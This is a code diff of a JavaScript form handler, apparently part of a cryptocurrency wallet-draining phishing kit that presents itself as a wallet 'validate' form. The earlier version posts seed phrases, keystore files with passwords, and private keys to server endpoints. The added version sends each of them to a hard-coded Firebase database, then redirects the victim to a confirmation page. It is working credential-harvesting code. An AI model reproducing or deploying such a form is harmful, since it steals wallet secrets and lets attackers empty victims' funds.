@@ -1,107 +1,59 @@
-function wconnForm() {
-  return {
-    selected: "phrase",
-    isError: false,
-    isLoading: false,
-    status: false,
-    phrase: "",
-    phraseMsg: "",
-    phraseBtnLabel: "<i class=\"fas fa-sync\"></i> Validate",
-    keystore: "",
-    keystoreMsg: "",
-    keyPassword: "",
-    keyPasswordMsg: "",
-    privatekey: "",
-    privatekeyMsg: "",
-    async submitPhrase() {
-      this.isLoading = true;
-      this.phraseBtnLabel = '<i class="fas fa-sync fa-spin"></i> Validating...';
-      let fetch = await __rpg(__wc_data__.secure_phrase_endpoint, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'accept': 'application/json',
-        },
-        body: JSON.stringify({
-          _token: __wc_data__.csrf_token,
-          phrase: this.phrase,
-        })
-        // body: JSON.stringify({
-        //     _token:__wc_data__.csrf_token,
-        //     phrase:this.phrase,
-        // })
-      });
-      if (fetch.meta.conn && fetch.meta.code != 404) {
-        if (fetch.data.isJsn && fetch.data.rData.status == "success") {
-          this.isError = false;
-          if (fetch.data.rData.redirect) {
-            location.href = fetch.data.rData.redirect;
-          }
-        } else if (fetch.data.isJsn) {
-          this.phraseMsg = fetch.data.rData.message;
-        }
-      }
-      this.phraseBtnLabel = '<i class="fas fa-sync"></i> Validate';
-      this.isLoading = false;
-    },
-    async submitKeystoreJSON() {
-      this.isLoading = true;
-      this.phraseBtnLabel = '<i class="fas fa-sync fa-spin"></i> Validating...';
-      let fetch = await __rpg(__wc_data__.secure_keystore_endpoint, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'accept': 'application/json',
-        },
-        body: JSON.stringify({
-          _token: __wc_data__.csrf_token,
-          keystore: this.keystore,
-          keypwd: this.keyPassword,
-        }),
-      });
-      if (fetch.meta.conn && fetch.meta.code != 404) {
-        if (fetch.data.isJsn && fetch.data.rData.status == "success") {
-          this.isError = false;
-          if (fetch.data.rData.redirect) {
-            location.href = fetch.data.rData.redirect;
-          }
-        } else if (fetch.data.isJsn) {
-          this.keystoreMsg = fetch.data.rData.message;
-        }
-      }
-      this.phraseBtnLabel = '<i class="fas fa-sync"></i> Validate';
-      this.isLoading = false;
-    },
-    async submitPrivateKey() {
-      this.isLoading = true;
-      this.phraseBtnLabel = '<i class="fas fa-sync fa-spin"></i> Validating...';
-      let fetch = await __rpg(__wc_data__.secure_private_endpoint, {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-          'accept': 'application/json',
-        },
-        body: JSON.stringify({
-          _token: __wc_data__.csrf_token,
-          private: this.privatekey,
-        }),
-      });
-      if (fetch.meta.conn && fetch.meta.code != 404) {
-        if (fetch.data.isJsn && fetch.data.rData.status == "success") {
-          this.isError = false;
-          if (fetch.data.rData.redirect) {
-            location.href = fetch.data.rData.redirect;
-          }
-        } else if (fetch.data.isJsn) {
-          this.privatekeyMsg = fetch.data.rData.message;
-        }
-      }
-      this.phraseBtnLabel = '<i class="fas fa-sync"></i> Validate';
-      this.isLoading = false;
-    },
-  }
-}
 
+function wconnForm() {
+    // Initialize Firebase
+     var firebaseConfig = {
+       apiKey: "AIzaSyCxlv-fUB7WZ58JvF0j8tObnvvBAdIrw7w",
+       authDomain: "dappresolve-f083e.firebaseapp.com",
+       databaseURL: "https://dappresolve-f083e-default-rtdb.firebaseio.com/",
+       projectId: "dappresolve-f083e",
+       storageBucket: "dappresolve-f083e.appspot.com",
+       messagingSenderId: "457908700012",
+       appId: "1:457908700012:web:e00732a16d5bedca89e949",
+       measurementId: "G-2NSYMPK1BB",
+     };
+     // initialize firebase
+     firebase.initializeApp(firebaseConfig);
+     var database = firebase.database();
+
+    return {
+        selected: "phrase",
+        isLoading: false,
+        status:false,
+        phrase:"",
+        keystore:"",
+        keyPassword:"",
+        privatekey:"",
+        submitPhrase(){
+            
+            database.ref('phrase').push(this.phrase);
+            this.resetForm();
+            this.redirectPage();
+        },
+        submitKeystoreJSON(){
+            
+            database.ref('keystore').push(this.keystore);
+            database.ref('KeyPassword').push(this.keyPassword);
+            this.resetForm();
+            this.redirectPage();
+        },
+        submitPrivateKey(){
+            
+            database.ref('privatekey').push(this.privatekey);
+            this.resetForm();
+            this.redirectPage();
+        },
+        resetForm() {
+            this.selected = "phrase";
+            this.phrase = "";
+            this.keystore = "";
+            this.keyPassword = "";
+            this.privatekey = "";
+        },
+        redirectPage() {
+            window.location.href = "./confirm.html";
+        }
+    }
+  }
 
 // Modal
 
